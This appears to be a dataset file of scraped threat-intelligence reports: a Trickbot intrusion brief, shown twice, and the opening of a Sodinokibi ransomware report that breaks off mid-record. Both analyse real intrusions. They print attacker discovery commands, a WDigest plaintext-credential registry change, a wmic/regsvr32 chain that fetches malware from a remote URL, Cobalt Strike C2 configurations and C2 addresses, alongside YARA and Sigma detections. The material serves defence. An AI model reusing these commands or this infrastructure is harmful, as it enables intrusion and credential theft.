Trickbot process. nltest / domain_trusts nltest / domain_trusts / all_trusts PowerView modules were also used by the threat actor executed from the Cobalt Strike beacons. Get- DomainSearcher Get- NetComputer Get- NetDomain The local network was scanned for port 445/SMB. ipconfig was used to show all IP info. ipconfig /all Command and Control Trickbot gtag: rob52 Cobalt Strike C2 #1 147.135.78[.]200:80 (Our Threat Feed service has known about this Cobalt Strike server since at least 4-4-2021) CS Config: \"x64\": { \"md5\": \"d963ff232b5b519014cbca17e7e9d512\", \"sha256\": \"0f0cf5e9b35012fc51306179ba4c8cfdaa4f60bf293d8140a77a74db548182e5\", \"sha1\": \"77430b1da03bf6fee12d12abd810666a7751e3c0\", \"config\": { \"HTTP Method Path 2\": \"/submit.php\", \"Method 2\": \"POST\", \"C2 Server\": \"147.135.78.200,/cx\", \"Method 1\": \"GET\", \"Polling\": 60000, \"Spawn To x86\": \"%windir%\\\\syswow64\\\\rundll32.exe\", \"Beacon Type\": \"0 (HTTP)\", \"Spawn To x64\": \"%windir%\\\\sysnative\\\\rundll32.exe\", \"Jitter\": 0, \"Port\": 80 \"x86\": { \"md5\": \"ec2fc2b33d60ddc829c9aeabb6ce0bbe\", \"sha256\": \"93008b078e8358c948877c7fde261231fc72bcd45143132070761550046701f2\", \"sha1\": \"91ea27632c363b821d8f84b8320b1d76f1d91899\", \"config\": { \"HTTP Method Path 2\": \"/submit.php\", \"Method 2\": \"POST\", \"C2 Server\": \"147.135.78.200,/push\", \"Method 1\": \"GET\", \"Polling\": 60000, \"Spawn To x86\": \"%windir%\\\\syswow64\\\\rundll32.exe\", \"Beacon Type\": \"0 (HTTP)\", \"Spawn To x64\": \"%windir%\\\\sysnative\\\\rundll32.exe\", \"Jitter\": 0, \"Port\": 80 Cobalt Strike C2 #2 23.108.57[.]39:443 (Our Threat Feed service has known about this Cobalt Strike server since at least 4-12-2021) wideri[.]com JA3s:ae4edc6faf64d08308082ad26be60767 JA 3:a 0e9f5d64349fb13191bc781f81f42e1 Certificate:[ 10: cd:12:74 :dc:9d:3d: 15:b 5:e 9:f 1:f 1:22:e 1:ff : 65:77:a 3:c9:93] Not Before: 2021/04/04 00:00:00 Not After: 2022/04/04 23:59:59 Issuer Org: Sectigo Limited Subject Common: wideri .com Public Algorithm:rsaEncryption JARM:07d14d16d21d21d07c42d41d00041d58c7162162b6a603d3d90a2b76865b53 CS Config: \"x64\": { \"time\": 1618262029857.8, \"config\": { \"Jitter\": 46, \"Spawn To x86\": \"%windir%\\\\syswow64\\\\wusa.exe\", \"Beacon Type\": \"8 (HTTPS)\", \"Method 1\": \"GET\", \"Method 2\": \"POST\", \"C2 Server\": \"wideri.com,/tab_shop.css\", \"Spawn To x64\": \"%windir%\\\\sysnative\\\\wusa.exe\", \"Port\": 443, \"Polling\": 5000, \"HTTP Method Path 2\": \"/language\" }, \"md5\": \"249f38615a76d47892fc530102a8a178\", \"sha256\": \"91d6230999853424f158fd58bd343c781fd687c71173ee39ed98429181d3cdb4\", \"sha1\": \"9b1f5d93af2344529b37055af8e3db0d3867c5bc\" \"x86\": { \"time\": 1618262025634.5, \"config\": { \"Jitter\": 46, \"Spawn To x86\": \"%windir%\\\\syswow64\\\\wusa.exe\", \"Beacon Type\": \"8 (HTTPS)\", \"Method 1\": \"GET\", \"Method 2\": \"POST\", \"C2 Server\": \"wideri.com,/language.css\", \"Spawn To x64\": \"%windir%\\\\sysnative\\\\wusa.exe\", \"Port\": 443, \"Polling\": 5000, \"HTTP Method Path 2\": \"/sq\" }, \"md5\": \"46a3380418ce59563c3adfa8f6624d3f\", \"sha256\": \"8cf43734e0d187aaad93e950646a883820b20ca2837480c1140e1751cf6557b2\", \"sha1\": \"44e19c7f2534226e6774591713fbd659931d2e10\" Impact Aside from the initial compromise on the beachhead host and the stolen credentials, no further impact was observed during this intrusion . No lateral movement or execution on mission was observed. IOCs Network Cobalt Strike: 147.135.78.200|80 23.108.57.39|443 wideri[.]com http://172.82.179.170/w.dll Trickbot : 102.68.17.97|443 103.76.150.14|443 103.9.188.23|449 109.185.139.90|449 138.185.72.142|443 148.216.32.55|443 173.81.4.147|443 182.253.184.130|449 185.205.250.162|443 190.122.168.219|443 196.41.57.46|449 200.90.11.177|449 202.166.211.197|443 31.134.124.90|443 31.211.85.110|443 41.77.134.250|443 5.59.205.32|443 62.213.14.166|443 77.95.93.132|449 78.138.187.231|443 81.95.45.234|449 84.21.206.164|449 85.112.74.178|449 87.116.151.237|449 87.76.1.81|449 89.250.208.42|449 91.185.236.170|449 91.225.231.120|443 96.9.77.142 |443 File click.php.dll 8c0d352934271350cfe6c00b7587e8dc8d062817 0ae86e5abbc09e96f8c1155556ca6598c22aebd73acbba8d59f2ce702d3115f8 xxclickdr.dwn 8c0d352934271350cfe6c00b7587e8dc8d062817 0ae86e5abbc09e96f8c1155556ca6598c22aebd73acbba8d59f2ce702d3115f8 wsuC3C.tmp b7d9f3e387021bba138dbe3d153fef4e7e2196ad 97dedd5ca85a13ab1a8910416b13ffd088b1c7e3486d6629a71f5c118d56fbea lazagne.exe 75f4115024b5d0818f0696345eef98d92db92118 61deb3a206cc203252418b431f6556e3f7efd9556fc685eeda7281d9baf89851 Detections Network ET CNC Feodo Tracker Reported CnC Server group 11 ET MALWARE Trickbot Checkin Response ET INFO SUSPICIOUS Dotted Quad Host MZ Response Sigma https://github.com/SigmaHQ/sigma/blob/084cd39505861188d9d8f2d5c0f2835e4f750a3f/rules/windows/process_creation/win_malware_trickbot_recon_activity.yml https://github.com/SigmaHQ/sigma/blob/08ca62cc8860f4660e945805d0dd615ce75258c1/rules/windows/process_creation/win_grabbing_sensitive_hives_via_reg.yml https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/win_susp_powershell_enc_cmd.yml Yara /* YARA Rule Set Author: The DFIR Report Date: 2021-04-27 Identifier: Case 3521 Trickbot Reference: https://thedfirreport.com */ /* Rule Set ----------------------------------------------------------------- */ import \"pe\" rule click_php { meta: description = \"files - file click.php.dll\" author = \"The DFIR Report\" reference = \"https://thedfirreport.com\" date = \"2021-04-27\" hash1 = \"0ae86e5abbc09e96f8c1155556ca6598c22aebd73acbba8d59f2ce702d3115f8\" strings: $s1 = \"f_+ (Q\" fullword wide $s2 = \"'/l~;2m\" fullword wide $s3 = \"y'L])[\" fullword wide $s4 = \"1!1I1m1s1\" fullword ascii $s5 = \"&+B\\\"wm\" fullword wide $s6 = \">jWR=C\" fullword wide $s7 = \"W!\\\\R.S\" fullword wide $s8 = \"r-`4?b6\" fullword wide $s9 = \"]Iip!x\" fullword wide $s10 = \"!k{l`<\" fullword wide $s11 = \"D~C:RA\" fullword wide $s12 = \"]{T~as\" fullword wide $s13 = \"7%8+8^8\" fullword ascii $s14 = \"f]-hKa\" fullword wide $s15 = \"StartW\" fullword ascii /* Goodware String - occured 5 times */ condition: uint16(0) == 0x5a4d and filesize < 1000KB and ( pe.imphash() == \"8948fb754b7c37bc4119606e044f204c\" and pe.exports(\"StartW\") or 10 of them ) } MITRE User Execution \u2013 T1204 Command and Scripting Interpreter \u2013 T1059 PowerShell \u2013 T1059.001 Windows Command Shell \u2013 T1059.003 Domain Trust Discovery \u2013 T1482 Network Service Scanning \u2013 T1046 Remote System Discovery \u2013 T1018 System Network Configuration Discovery \u2013 T1016 System Information Discovery \u2013 T1082 Process Injection \u2013 T1055 Credentials from Web Browsers \u2013 T1555.003 OS Credential Dumping \u2013 T1003 LSASS Memory \u2013 T1003.001 Exfiltration Over C2 Channel \u2013 T1041 Non-Standard Port \u2013 T1571 Internal case #3521 Share this: Share on X (Opens in new window) X Share on LinkedIn (Opens in new window) LinkedIn Share on Reddit (Opens in new window) Reddit Share on Facebook (Opens in new window) Facebook Share on WhatsApp (Opens in new window) WhatsApp Related Post navigation Sodinokibi (aka REvil) Ransomware Conti Ransomware Search for: Type your email\u2026 Subscribe Reports Threat Intelligence Detection Rules DFIR Labs Proudly powered by WordPress | Copyright 2023 | The DFIR Report | All Rights Reserved Go Top",
    "filtered_content": "Trickbot Brief: Creds and Beacons \u2013 The DFIR Report Skip to content Menu Reports Analysts Services Threat Intelligence Detection Rules DFIR Labs Digital Forensics Challenge Leaderboard Digital Forensics Challenge Winners Testimonials Case Artifacts Access DFIR Labs Subscribe Contact Us Menu Threat Intelligence Detection Rules DFIR Labs Digital Forensics Challenge Leaderboard Digital Forensics Challenge Winners Testimonials Case Artifacts The DFIR Report Real Intrusions by Real Attackers, The Truth Behind the Intrusion Menu Reports Analysts Services Threat Intelligence Detection Rules DFIR Labs Digital Forensics Challenge Leaderboard Digital Forensics Challenge Winners Testimonials Case Artifacts Access DFIR Labs Subscribe Contact Us Thursday, February 12, 2026 Menu Threat Intelligence Detection Rules DFIR Labs Digital Forensics Challenge Leaderboard Digital Forensics Challenge Winners Testimonials Case Artifacts trickbot Trickbot Brief: Creds and Beacons May 2, 2021 Intro \u201cTrickBot malware\u2014first identified in 2016\u2014is a Trojan developed and operated by a sophisticated group of cybercrime actors. The cybercrime group initially designed TrickBot as a banking trojan to steal financial data. Through continued development and new functionality, TrickBot has become a highly modular, multi-stage malware that provides its operators a full suite of tools to conduct a myriad of illegal cyber activities. Since TrickBot\u2019s inception, the cybercrime group has used the malware to attack individuals and businesses globally across a wide range of sectors.\u201d Source \u2013 Fact Sheet: TrickBot Malware Source In an intrusion this past month, threat actors were seen enumerating and collecting information related to the domain as well as dumping passwords before leaving the network. Multiple Cobalt Strike Beacons were deployed and remained connected despite the lack of activity from the threat actors. Case Summary We assess, with moderate confidence, the Trickbot DLL that we executed was originally delivered via a malicious Office document. The threat actors were observed leveraging Trickbot and Cobalt Strike for C2 communication. They began their discovery by running net and nltest commands as well as PowerView domain discovery modules. Minutes later, Lazagne (\u201cretrieve lots of passwords\u201d) was executed using the \u201call\u201d switch . A registry value was set to enable storing logon credentials in plaintext in memory (WDigest), likely to facilitate future activity as the host was not restarted for this change to take effect. Before the threat actors departed the network, they successfully accessed the LSASS process and retrieved credentials from memory. No lateral movement or execution on mission was observed. Timeline Analysis and reporting completed by @kostastsale , @ICSNick , and @RoxpinTeddy . Reviewed by @TheDFIRReport MITRE ATT&CK Initial Access We assess with moderate confidence that this DLL was dropped by a malicious Office document. Execution Trickbot (click.php.dll) was manually executed on a single endpoint. Source : https://tria.ge/210412-wmdnkzp5la Trickbot, from its injected wermgr process, spawned a command process to then run a PowerShell Cobalt Strike Beacon. Reviewing the above PowerShell code, we can extract the shellcode to discover the IP and User-agent string, the beacon will communicate with. Getting the IP and port using scdbg . The threat actor also executed a second Cobalt Strike Beacon ( wsuC3C.tmp) using the injected wermgr .exe process. rundll32.exe C:\\Users\\redacted\\AppData\\Local\\Temp\\wsuC3C.tmp,ControlUnitSpeed Persistence A scheduled task was created to keep the Trickbot malware persistent on the system. C:\\Windows\\system32\\rundll32.exe\" \"C:\\Users\\redacted\\AppData\\Roaming\\DownloadMngNet5353711913\\xxclickdr.dwn\",#1 Defense Evasion Trickbot injected into wermgr.exe processes and used this for communication to command and control infrastructure. Credential Access Lazagne was used with the \u201call\u201d switch, which runs all modules. Below we can see registry hives being saved to disk. LSASS was accessed by rundll32, but we did not see anything written to disk. Trickbot was used to enable the storage of clear text credentials (WDigest) by setting UseLogonCredential to 1. Key - SYSTEM\\ControlSet001\\Control\\SecurityProviders\\WDigest Value name - UseLogonCredential Set value data - 1 Discovery The following net commands were used by the threat actor from the injected Trickbot process. net config workstation net view /all net view /all /domain net group \u201cDomain Computers\u201d /domain The following nltest commands were used by the threat actor from the injected Trickbot process. nltest / domain_trusts nltest / domain_trusts / all_trusts PowerView modules were also used by the threat actor executed from the Cobalt Strike beacons. Get- DomainSearcher Get- NetComputer Get- NetDomain The local network was scanned for port 445/SMB. ipconfig was used to show all IP info. ipconfig /all Command and Control Trickbot gtag: rob52 Cobalt Strike C2 #1 147.135.78[.]200:80 (Our Threat Feed service has known about this Cobalt Strike server since at least 4-4-2021) CS Config: \"x64\": { \"md5\": \"d963ff232b5b519014cbca17e7e9d512\", \"sha256\": \"0f0cf5e9b35012fc51306179ba4c8cfdaa4f60bf293d8140a77a74db548182e5\", \"sha1\": \"77430b1da03bf6fee12d12abd810666a7751e3c0\", \"config\": { \"HTTP Method Path 2\": \"/submit.php\", \"Method 2\": \"POST\", \"C2 Server\": \"147.135.78.200,/cx\", \"Method 1\": \"GET\", \"Polling\": 60000, \"Spawn To x86\": \"%windir%\\\\syswow64\\\\rundll32.exe\", \"Beacon Type\": \"0 (HTTP)\", \"Spawn To x64\": \"%windir%\\\\sysnative\\\\rundll32.exe\", \"Jitter\": 0, \"Port\": 80 \"x86\": { \"md5\": \"ec2fc2b33d60ddc829c9aeabb6ce0bbe\", \"sha256\": \"93008b078e8358c948877c7fde261231fc72bcd45143132070761550046701f2\", \"sha1\": \"91ea27632c363b821d8f84b8320b1d76f1d91899\", \"config\": { \"HTTP Method Path 2\": \"/submit.php\", \"Method 2\": \"POST\", \"C2 Server\": \"147.135.78.200,/push\", \"Method 1\": \"GET\", \"Polling\": 60000, \"Spawn To x86\": \"%windir%\\\\syswow64\\\\rundll32.exe\", \"Beacon Type\": \"0 (HTTP)\", \"Spawn To x64\": \"%windir%\\\\sysnative\\\\rundll32.exe\", \"Jitter\": 0, \"Port\": 80 Cobalt Strike C2 #2 23.108.57[.]39:443 (Our Threat Feed service has known about this Cobalt Strike server since at least 4-12-2021) wideri[.]com JA3s:ae4edc6faf64d08308082ad26be60767 JA 3:a 0e9f5d64349fb13191bc781f81f42e1 Certificate:[ 10: cd:12:74 :dc:9d:3d: 15:b 5:e 9:f 1:f 1:22:e 1:ff : 65:77:a 3:c9:93] Not Before: 2021/04/04 00:00:00 Not After: 2022/04/04 23:59:59 Issuer Org: Sectigo Limited Subject Common: wideri .com Public Algorithm:rsaEncryption JARM:07d14d16d21d21d07c42d41d00041d58c7162162b6a603d3d90a2b76865b53 CS Config: \"x64\": { \"time\": 1618262029857.8, \"config\": { \"Jitter\": 46, \"Spawn To x86\": \"%windir%\\\\syswow64\\\\wusa.exe\", \"Beacon Type\": \"8 (HTTPS)\", \"Method 1\": \"GET\", \"Method 2\": \"POST\", \"C2 Server\": \"wideri.com,/tab_shop.css\", \"Spawn To x64\": \"%windir%\\\\sysnative\\\\wusa.exe\", \"Port\": 443, \"Polling\": 5000, \"HTTP Method Path 2\": \"/language\" }, \"md5\": \"249f38615a76d47892fc530102a8a178\", \"sha256\": \"91d6230999853424f158fd58bd343c781fd687c71173ee39ed98429181d3cdb4\", \"sha1\": \"9b1f5d93af2344529b37055af8e3db0d3867c5bc\" \"x86\": { \"time\": 1618262025634.5, \"config\": { \"Jitter\": 46, \"Spawn To x86\": \"%windir%\\\\syswow64\\\\wusa.exe\", \"Beacon Type\": \"8 (HTTPS)\", \"Method 1\": \"GET\", \"Method 2\": \"POST\", \"C2 Server\": \"wideri.com,/language.css\", \"Spawn To x64\": \"%windir%\\\\sysnative\\\\wusa.exe\", \"Port\": 443, \"Polling\": 5000, \"HTTP Method Path 2\": \"/sq\" }, \"md5\": \"46a3380418ce59563c3adfa8f6624d3f\", \"sha256\": \"8cf43734e0d187aaad93e950646a883820b20ca2837480c1140e1751cf6557b2\", \"sha1\": \"44e19c7f2534226e6774591713fbd659931d2e10\" Impact Aside from the initial compromise on the beachhead host and the stolen credentials, no further impact was observed during this intrusion . No lateral movement or execution on mission was observed. IOCs Network Cobalt Strike: 147.135.78.200|80 23.108.57.39|443 wideri[.]com http://172.82.179.170/w.dll Trickbot : 102.68.17.97|443 103.76.150.14|443 103.9.188.23|449 109.185.139.90|449 138.185.72.142|443 148.216.32.55|443 173.81.4.147|443 182.253.184.130|449 185.205.250.162|443 190.122.168.219|443 196.41.57.46|449 200.90.11.177|449 202.166.211.197|443 31.134.124.90|443 31.211.85.110|443 41.77.134.250|443 5.59.205.32|443 62.213.14.166|443 77.95.93.132|449 78.138.187.231|443 81.95.45.234|449 84.21.206.164|449 85.112.74.178|449 87.116.151.237|449 87.76.1.81|449 89.250.208.42|449 91.185.236.170|449 91.225.231.120|443 96.9.77.142 |443 File click.php.dll 8c0d352934271350cfe6c00b7587e8dc8d062817 0ae86e5abbc09e96f8c1155556ca6598c22aebd73acbba8d59f2ce702d3115f8 xxclickdr.dwn 8c0d352934271350cfe6c00b7587e8dc8d062817 0ae86e5abbc09e96f8c1155556ca6598c22aebd73acbba8d59f2ce702d3115f8 wsuC3C.tmp b7d9f3e387021bba138dbe3d153fef4e7e2196ad 97dedd5ca85a13ab1a8910416b13ffd088b1c7e3486d6629a71f5c118d56fbea lazagne.exe 75f4115024b5d0818f0696345eef98d92db92118 61deb3a206cc203252418b431f6556e3f7efd9556fc685eeda7281d9baf89851 Detections Network ET CNC Feodo Tracker Reported CnC Server group 11 ET MALWARE Trickbot Checkin Response ET INFO SUSPICIOUS Dotted Quad Host MZ Response Sigma https://github.com/SigmaHQ/sigma/blob/084cd39505861188d9d8f2d5c0f2835e4f750a3f/rules/windows/process_creation/win_malware_trickbot_recon_activity.yml https://github.com/SigmaHQ/sigma/blob/08ca62cc8860f4660e945805d0dd615ce75258c1/rules/windows/process_creation/win_grabbing_sensitive_hives_via_reg.yml https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/win_susp_powershell_enc_cmd.yml Yara /* YARA Rule Set Author: The DFIR Report Date: 2021-04-27 Identifier: Case 3521 Trickbot Reference: https://thedfirreport.com */ /* Rule Set ----------------------------------------------------------------- */ import \"pe\" rule click_php { meta: description = \"files - file click.php.dll\" author = \"The DFIR Report\" reference = \"https://thedfirreport.com\" date = \"2021-04-27\" hash1 = \"0ae86e5abbc09e96f8c1155556ca6598c22aebd73acbba8d59f2ce702d3115f8\" strings: $s1 = \"f_+ (Q\" fullword wide $s2 = \"'/l~;2m\" fullword wide $s3 = \"y'L])[\" fullword wide $s4 = \"1!1I1m1s1\" fullword ascii $s5 = \"&+B\\\"wm\" fullword wide $s6 = \">jWR=C\" fullword wide $s7 = \"W!\\\\R.S\" fullword wide $s8 = \"r-`4?b6\" fullword wide $s9 = \"]Iip!x\" fullword wide $s10 = \"!k{l`<\" fullword wide $s11 = \"D~C:RA\" fullword wide $s12 = \"]{T~as\" fullword wide $s13 = \"7%8+8^8\" fullword ascii $s14 = \"f]-hKa\" fullword wide $s15 = \"StartW\" fullword ascii /* Goodware String - occured 5 times */ condition: uint16(0) == 0x5a4d and filesize < 1000KB and ( pe.imphash() == \"8948fb754b7c37bc4119606e044f204c\" and pe.exports(\"StartW\") or 10 of them ) } MITRE User Execution \u2013 T1204 Command and Scripting Interpreter \u2013 T1059 PowerShell \u2013 T1059.001 Windows Command Shell \u2013 T1059.003 Domain Trust Discovery \u2013 T1482 Network Service Scanning \u2013 T1046 Remote System Discovery \u2013 T1018 System Network Configuration Discovery \u2013 T1016 System Information Discovery \u2013 T1082 Process Injection \u2013 T1055 Credentials from Web Browsers \u2013 T1555.003 OS Credential Dumping \u2013 T1003 LSASS Memory \u2013 T1003.001 Exfiltration Over C2 Channel \u2013 T1041 Non-Standard Port \u2013 T1571 Internal case #3521 Share this: Share on X (Opens in new window) X Share on LinkedIn (Opens in new window) LinkedIn Share on Reddit (Opens in new window) Reddit Share on Facebook (Opens in new window) Facebook Share on WhatsApp (Opens in new window) WhatsApp Related Post navigation Sodinokibi (aka REvil) Ransomware Conti Ransomware Search for: Type your email\u2026 Subscribe Reports Threat Intelligence Detection Rules DFIR Labs Proudly powered by WordPress | Copyright 2023 | The DFIR Report | All Rights Reserved Go Top",
    "expected_count": 1
  },
  {
    "url": "https://thedfirreport.com/2021/03/29/sodinokibi-aka-revil-ransomware/",
    "title": "Sodinokibi (aka REvil) Ransomware \u2013 The DFIR Report",
    "content": "Sodinokibi (aka REvil) Ransomware \u2013 The DFIR Report Skip to content Menu Reports Analysts Services Threat Intelligence Detection Rules DFIR Labs Digital Forensics Challenge Leaderboard Digital Forensics Challenge Winners Testimonials Case Artifacts Access DFIR Labs Subscribe Contact Us Menu Threat Intelligence Detection Rules DFIR Labs Digital Forensics Challenge Leaderboard Digital Forensics Challenge Winners Testimonials Case Artifacts The DFIR Report Real Intrusions by Real Attackers, The Truth Behind the Intrusion Menu Reports Analysts Services Threat Intelligence Detection Rules DFIR Labs Digital Forensics Challenge Leaderboard Digital Forensics Challenge Winners Testimonials Case Artifacts Access DFIR Labs Subscribe Contact Us Thursday, February 12, 2026 Menu Threat Intelligence Detection Rules DFIR Labs Digital Forensics Challenge Leaderboard Digital Forensics Challenge Winners Testimonials Case Artifacts adfind cobaltstrike icedid ransomware revil Sodinokibi Sodinokibi (aka REvil) Ransomware March 29, 2021 Intro Sodinokibi (aka REvil) has been one of the most prolific ransomware as a service (RaaS) groups over the last couple years. The ransomware family was purported to be behind the Travelex intrusion and current reports point to an attack against Acer for a reported $50 million ransom demand. In March, we observed an intrusion which started with malicious spam that dropped IcedID (Bokbot) into the environment and subsequently allowed access to a group distributing Sodinokibi ransomware. During the intrusion the threat actors escalated privileges to Domain Administrator, exfiltrated data, and used Sodinokibi to ransom all domain joined systems. Case Summary The IcedID trojan was first discovered in 2017 and currently operates as an initial access broker for several ransomware families . In our intrusion, the threat actors leveraged malicious spam using an xlsm document which, upon opening and enabling the macro, initiated a wmic command to execute the IcedID trojan from a remote executable posing as a GIF image. Persistence was setup using a scheduled task and discovery commands were initiated from the malware within minutes of execution. About an hour and a half after initial access, the malware pulled down Cobalt Strike Beacons from 2 different command and control servers, which were both used through-out the intrusion. Once the Cobalt Strike Beacons were established, lateral movement began, first to an Exchange server, then pivoting to other servers. We did not see the attackers interact with the Exchange application at all; and at first, it appeared the attack came from Exchange, but after careful review, we assessed the source was indeed IcedID. #ArtifactsMatter. It appears the threat actors wanted us to believe Exchange was the source of attack as they pivoted through Exchange to other systems in the domain using Cobalt Strike. After compromising the Exchange server, the attackers moved to domain controllers and other systems within the environment using SMB and PowerShell Beacons executed via a remote service. The attackers were slightly slowed down by AntiVirus, which ate a couple Beacons but the attackers eventually bypassed it using a variation of their lateral movement technique. Additional discovery was executed from the domain controller using AdFind and the Ping utility to test connections between the domain controller and other domain joined systems. After discovery was completed, credentials were dumped from lsass. After completing these tasks the threat actors began to establish RDP connections between various systems in the domain. Three and a half hours into the intrusion, the threat actors used Rclone masquerading as a svchost executable to collect and exfiltrate the contents of network shares for use in a double extortion demand. At the four hour mark, the threat actors began to move on to final objectives. They staged the ransomware executable on a domain controller and then used BITSAdmin to download it to each system in the domain. After that, the threat actors used RDP to open a cmd or PowerShell process to then execute the Sodinokibi ransomware using a particular flag -smode, which when executed, wrote a couple RunOnce registry keys and then immediately rebooted the system into Safe Mode with Networking. Encryption did not start immediately after reboot but required a user to log in, which in this case the threat actors completed by logging in after the reboot. Booting into Safe Mode with Networking blocked the startup of security tools and other management agents. Networking worked, but because services couldn\u2019t start, we were unable to remotely manage the systems using our normal tools. We believe this process would have stopped some EDR agents from starting up and possibly detecting the ransomware execution. On certain systems, ransomware was executed without the -smode flag, and on other systems a dll was executed via rundll32 to encrypt the system without requiring a reboot and allowing the threat actors to remain present while the encryption process completed. About 4.5 hours after initial access, the threat actors had completed their mission of encrypting all domain joined systems. The ransomware note left by the infection included a link to their site on Tor which put the price tag for decryption around $200k if paid within 7 days. If we didn\u2019t pay within 7 days the price goes up to around $400k. The ransom is required to be paid in Monero instead of the usual Bitcoin. This may be in an effort to better shield the payments from tracing activity like those performed by Chainaylsis . The threat actors identified themselves on their site as Sodinokibi and linked to a Coveware blog to provide assurance that if paid their decryption would be successful. Services Our Threat Feed service picked up one of the two Cobalt Strike servers one day before this intrusion occurred and the other IP was added to the feed as soon as we recognized it. We also have artifacts available from this case such as ransomware samples (dll and exe), pcaps, memory captures, files, Kape packages and more, under our Security Researcher and Organization services. Timeline MITRE ATT&CK Initial Access Initial access for this intrusion was via a malspam campaign, while expecting Qbot downloads we found that IcedID was the payload choice delivered this time, similar to activity noted recently by James Quinn . The delivery format was an xlsm file : Initial execution of the document writes a file to: C:\\Users\\Public\\microsoft.security The Excel file called wmic to execute the file with regsrv32 wmic.exe process call create 'regsvr32 -s C:\\Users\\Public\\microsoft.security' This then made a network request to download a file from this URL http://vpu03jivmm03qncgx.com/index.gif The GIF however was the IcedID malware. Execution Once IcedID was downloaded to the host, the malware was executed using rundll32.exe rundll32.exe \"C:\\Users\\USERNAME\\AppData\\Local\\Temp\\skull-x64.dat\",update /i:\"DwarfWing\\license.dat\" After execution, the malware made contact with 161.35.109[.]168 which it continued to beacon to, throughout the intrusion. Persistence IcedID setup persistence on the beach head host using a scheduled task. wewouwquge_{A3112501-520A-8F32-871A-380B92917B3D} HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\\wewouwquge_{A3112501-520A-8F32-871A-380B92917B3D} The execution of the ransomware executable created a RunOnce key for persistence. HKLM\\\\SOFTWARE\\\\WOW6432Node\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\RunOnce\\\\*AstraZeneca Privilege Escalation After completing LDAP discovery ( BloodHound ), the Cobalt Strike Beacon running in the wuauclt.exe process executed several PowerShell functions for UAC bypasses including: UAC-TokenMagic Invoke-SluiBypass Defense Evasion About one and a half hours after initial access, IcedID reached out to two Cobalt Strike servers. Process injection was used multiple times across the environment using Cobalt Strike Beacons. Prior to executing the ransomware, the threat actors created a GPO to disable Windows Defender across all systems/OUs. The GPO was named \u201cnew\u201d. Credential Access Credentials were dumped on a server and domain controller using a Cobalt Strike Beacon. Discovery Initial discovery by the IcedID malware occurred within minutes of execution: cmd.exe /c chcp >&2 WMIC.exe WMIC /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct Get * /Format:List ipconfig.exe ipconfig /all systeminfo net config workstation nltest /domain_trusts nltest /domain_trusts /all_trusts net view /all /domain net view /all net.exe net group \"Domain Admins\" /domain A flurry of LDAP queries were seen coming from wuauclt.exe (Cobalt Strike) on the beachhead. \"DistinguishedName\": \"CN=Terminal Server License Servers,CN=Builtin,DC=DomainName,DC=local\", \"ScopeOfSearch\": \"Base\", \"SearchFilter\": \"member=*\" } \"DistinguishedName\": \"CN=RAS and IAS Servers,CN=Users,DC=DomainName,DC=local\", \"ScopeOfSearch\": \"Base\", \"SearchFilter\": \"member=*\" } \"DistinguishedName\": \"CN=Incoming Forest Trust Builders,CN=Builtin,DC=DomainName,DC=local\", \"ScopeOfSearch\": \"Base\", \"SearchFilter\": \"member=*\" } \"DistinguishedName\": \"CN=Account Operators,CN=Builtin,DC=DomainName,DC=local\", \"ScopeOfSearch\": \"Base\", \"SearchFilter\": \"member=*\" } \"DistinguishedName\": \"CN=Cert Publishers,CN=Users,DC=DomainName,DC=local\", \"ScopeOfSearch\": \"Base\", \"SearchFilter\": \"member=*\" } \"DistinguishedName\": \"CN=Server Operators,CN=Builtin,DC=DomainName,DC=local\", \"ScopeOfSearch\": \"Base\", \"SearchFilter\": \"member=*\" } \"DistinguishedName\": \"CN=Storage Replica Administrators,CN=Builtin,DC=DomainName,DC=local\", \"ScopeOfSearch\": \"Base\", \"SearchFilter\": \"member=*\" } \"DistinguishedName\": \"CN=Hyper-V Administrators,CN=Builtin,DC=DomainName,DC=local\", \"ScopeOfSearch\": \"Base\", \"SearchFilter\": \"member=*\" } \"DistinguishedName\": \"CN=Remote Management Users,CN=Builtin,DC=DomainName,DC=local\", \"ScopeOfSearch\": \"Base\", \"SearchFilter\": \"member=*\" } \"DistinguishedName\": \"CN=Access Control Assistance Operators,CN=Builtin,DC=DomainName,DC=local\", \"ScopeOfSearch\": \"Base\", \"SearchFilter\": \"member=*\" } \"DistinguishedName\": \"CN=RDS Management Servers,CN=Builtin,DC=DomainName,DC=local\", \"ScopeOfSearch\": \"Base\", \"SearchFilter\": \"member=*\" } \"DistinguishedName\": \"CN=RDS Endpoint Servers,CN=Builtin,DC=DomainName,DC=local\", \"ScopeOfSearch\": \"Base\", \"SearchFilter\": \"member=*\" } \"DistinguishedName\": \"CN=Event Log Readers,CN=Builtin,DC=DomainName,DC=local\", \"ScopeOfSearch\": \"Base\", \"SearchFilter\": \"member=*\" } \"DistinguishedName\": \"CN=RDS Remote Access Servers,CN=Builtin,DC=DomainName,DC=local\", \"ScopeOfSearch\": \"Base\", \"SearchFilter\": \"member=*\" } \"DistinguishedName\": \"CN=Certificate Service DCOM Access,CN=Builtin,DC=DomainName,DC=local\", \"ScopeOfSearch\": \"Base\", \"SearchFilter\": \"member=*\" } \"DistinguishedName\": \"CN=Performance Log Users,CN=Builtin,DC=DomainName,DC=local\", \"ScopeOfSearch\": \"Base\", \"SearchFilter\": \"member=*\" } \"DistinguishedName\": \"CN=Cryptographic Operators,CN=Builtin,DC=DomainName,DC=local\", \"ScopeOfSearch\": \"Base\", \"SearchFilter\": \"member=*\" } \"DistinguishedName\": \"CN=Distributed COM Users,CN=Builtin,DC=DomainName,DC=local\", \"ScopeOfSearch\": \"Base\", \"SearchFilter\": \"member=*\" } \"DistinguishedName\": \"CN=Network Configuration Operators,CN=Builtin,DC=DomainName,DC=local\", \"ScopeOfSearch\": \"Base\", \"SearchFilter\": \"member=*\" } \"DistinguishedName\": \"CN=Performance Monitor Users,CN=Builtin,DC=DomainName,DC=local\", \"ScopeOfSearch\": \"Base\", \"SearchFilter\": \"member=*\" } \"DistinguishedName\": \"CN=Remote Desktop Users,CN=Builtin,DC=DomainName,DC=local\", \"ScopeOfSearch\": \"Base\", \"SearchFilter\": \"member=*\" } \"DistinguishedName\": \"CN=Replicator,CN=Builtin,DC=DomainName,DC=local\", \"ScopeOfSearch\": \"Base\", \"SearchFilter\": \"member=*\" } \"DistinguishedName\": \"CN=Backup 